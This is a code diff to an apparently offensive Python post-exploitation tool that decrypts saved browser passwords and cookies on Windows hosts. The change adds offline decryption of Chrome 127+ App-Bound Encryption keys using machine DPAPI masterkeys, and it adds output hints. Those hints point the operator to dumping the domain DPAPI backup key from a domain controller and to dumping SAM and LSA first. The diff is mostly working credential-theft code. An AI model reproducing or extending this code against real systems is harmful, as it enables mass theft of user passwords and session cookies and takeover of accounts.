@@ -887,22 +887,49 @@ def _collect_dpapi_files(host: str, auth: list, workdir: str, verbose: bool) -> 
 
 # ── DPAPI: Chrome / Edge decryption ──────────────────────────────────────────
 
-def _chrome_aes_key(local_state_path: str, masterkeys: dict) -> bytes:
+_CHROME_KEY_RESULT_DPAPI = 'dpapi'
+_CHROME_KEY_RESULT_APPB  = 'appb'
+_CHROME_KEY_RESULT_NONE  = 'none'
+
+
+def _chrome_aes_key(local_state_path: str, masterkeys: dict) -> tuple:
+    """Return (aes_key_bytes_or_None, key_type_str).
+
+    key_type_str is one of:
+      'dpapi'   — classic DPAPI-wrapped key, decrypted successfully
+      'appb'    — Chrome 127+ App-Bound Key (machine DPAPI), decrypted successfully
+      'appb_no_mk' — APPB but machine masterkeys unavailable / decrypt failed
+      'dpapi_no_mk' — DPAPI but user masterkey unavailable / decrypt failed
+      'none'    — Local State missing or no encrypted_key field
+    """
     if not local_state_path or not os.path.isfile(local_state_path):
-        return None
+        return None, _CHROME_KEY_RESULT_NONE
     try:
         with open(local_state_path, 'r', encoding='utf-8', errors='replace') as f:
             ls = json.load(f)
         b64 = ls.get('os_crypt', {}).get('encrypted_key', '')
         if not b64:
-            return None
+            return None, _CHROME_KEY_RESULT_NONE
         raw = base64.b64decode(b64)
-        if not raw.startswith(b'DPAPI'):
-            return None
-        plain = _blob_decrypt(raw[5:], masterkeys)
-        return plain[:32] if plain and len(plain) >= 32 else None
+
+        if raw.startswith(b'DPAPI'):
+            plain = _blob_decrypt(raw[5:], masterkeys)
+            if plain and len(plain) >= 32:
+                return plain[:32], _CHROME_KEY_RESULT_DPAPI
+            return None, 'dpapi_no_mk'
+
+        if raw.startswith(b'APPB'):
+            # Chrome 127+ App-Bound Encryption: machine-context CryptProtectData
+            # (CRYPTPROTECT_LOCAL_MACHINE) wraps the 32-byte AES-256 browser key.
+            # We already hold machine masterkeys from DPAPI_SYSTEM — decrypt offline.
+            plain = _blob_decrypt(raw[4:], masterkeys)
+            if plain and len(plain) >= 32:
+                return plain[-32:], _CHROME_KEY_RESULT_APPB
+            return None, 'appb_no_mk'
+
+        return None, _CHROME_KEY_RESULT_NONE
     except Exception:
-        return None
+        return None, _CHROME_KEY_RESULT_NONE
 
 
 def _chrome_decrypt_value(enc: bytes, aes_key: bytes, masterkeys: dict) -> str:
@@ -1034,10 +1061,19 @@ def _dump_sccm_naa(host: str, auth: list, masterkeys: dict, out: list, verbose: 
 
 # ── DPAPI: Browser passwords ──────────────────────────────────────────────────
 
+_KEY_FAIL_HINT = {
+    'dpapi_no_mk':  'user masterkey not decrypted — run: titan dump --backupkey -t <DC>, '
+                    'then --dpapi-backupkey <pem> on this target',
+    'appb_no_mk':   'Chrome 127+ App-Bound Key — machine masterkey unavailable; '
+                    'ensure DPAPI_SYSTEM was dumped (SAM+LSA first, then --dpapi)',
+    'none':         'Local State missing or no encrypted_key field',
+}
+
+
 def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str, out: list):
     header_printed = False
     for username, info in browser_files.items():
-        aes_key    = _chrome_aes_key(info.get('local_state'), masterkeys)
+        aes_key, key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
         login_data = info.get('login_data')
         if not login_data or not os.path.isfile(login_data):
             continue
@@ -1052,20 +1088,29 @@ def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str,
         except Exception:
             continue
         finally:
-            try: os.remove(tmp)
-            except: pass
+            try:
+                os.remove(tmp)
+            except Exception:
+                pass
+
         creds = []
         for url, uname, enc_pw in rows:
             if not enc_pw:
                 continue
             pw = _chrome_decrypt_value(bytes(enc_pw), aes_key, masterkeys)
-            creds.append((url, uname, pw or '[encrypted — masterkey missing]'))
+            if pw is None and key_type in _KEY_FAIL_HINT:
+                pw = f'[encrypted — {_KEY_FAIL_HINT[key_type]}]'
+            elif pw is None:
+                pw = '[encrypted — masterkey missing]'
+            creds.append((url, uname, pw))
+
         if creds:
             if not header_printed:
                 out.append(f'\n[*] {browser} Saved Passwords')
                 out.append('-' * 60)
                 header_printed = True
-            out.append(f'\n  User profile: {username}')
+            key_tag = f'  [key: {key_type}]' if key_type else ''
+            out.append(f'\n  User profile: {username}{key_tag}')
             for url, uname, pw in creds:
                 out.append(f'  URL:      {url}')
                 out.append(f'  Username: {uname}')
@@ -1077,7 +1122,7 @@ def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str,
 def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, out: list):
     header_printed = False
     for username, info in browser_files.items():
-        aes_key    = _chrome_aes_key(info.get('local_state'), masterkeys)
+        aes_key, _key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
         cookies_db = info.get('cookies')
         if not cookies_db or not os.path.isfile(cookies_db):
             continue
@@ -1599,8 +1644,30 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
         total_mk = len(masterkeys)
         out.append(f'[*] Total masterkeys available: {total_mk}')
         if total_mk == 0:
-            out.append('[!] No masterkeys decrypted — Chrome/CredMan output will be limited')
-            out.append('    For domain user creds, supply --dpapi-backupkey <pem>  (see -h)')
+            out.append('[!] No masterkeys decrypted — browser passwords and CredMan will be encrypted')
+            out.append('    Domain accounts: titan dump --backupkey -t <DC>  →  '
+                       'titan dump --dpapi --dpapi-backupkey <pem> -t <target>')
+            out.append('    Local accounts:  ensure SAM was dumped first (-A or --sam --dpapi)')
+        elif not any(files['user_mks'].values()):
+            pass
+        else:
+            # Diagnose Chrome key types before dumping — helps the user understand output
+            all_browsers = [
+                (files['chrome'], 'Chrome'),
+                (files['edge'],   'Edge'),
+                (files['brave'],  'Brave'),
+            ]
+            appb_count = dpapi_count = no_mk_count = 0
+            for browser_files, _ in all_browsers:
+                for info in browser_files.values():
+                    _, kt = _chrome_aes_key(info.get('local_state'), masterkeys)
+                    if kt == 'appb':        appb_count  += 1
+                    elif kt == 'dpapi':     dpapi_count += 1
+                    elif kt in ('dpapi_no_mk', 'appb_no_mk'): no_mk_count += 1
+            if appb_count or dpapi_count or no_mk_count:
+                out.append(f'[*] Browser key types: {dpapi_count} DPAPI-decrypted, '
+                           f'{appb_count} APPB-decrypted (Chrome 127+), '
+                           f'{no_mk_count} encrypted (masterkey unavailable)')
 
         _dump_browser_passwords(files['chrome'], masterkeys, 'Chrome', out)
         _dump_browser_passwords(files['edge'],   masterkeys, 'Edge',   out)
